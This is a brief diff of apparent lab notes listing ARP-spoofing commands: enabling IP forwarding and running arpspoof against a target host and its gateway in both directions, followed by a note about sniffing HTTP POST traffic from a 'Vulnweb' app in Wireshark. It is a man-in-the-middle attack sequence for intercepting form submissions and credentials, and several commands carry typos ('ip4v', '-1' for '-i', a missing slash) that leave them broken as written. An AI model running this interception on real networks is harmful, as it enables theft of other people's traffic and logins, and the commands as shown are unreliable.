@@ -1,3 +1,7 @@
 echo 1>proc/sys/net/ip4v/ip_forward
 arpspoof -i eth0 -t 172.25.4.7 172.25.4.1
 arpspoof -1 eth0 -t 172.25.4.1 172.25.4.7
+
+
+Vulnweb 
+app->snif and spoofing ->wireshark ->eth0->http->post
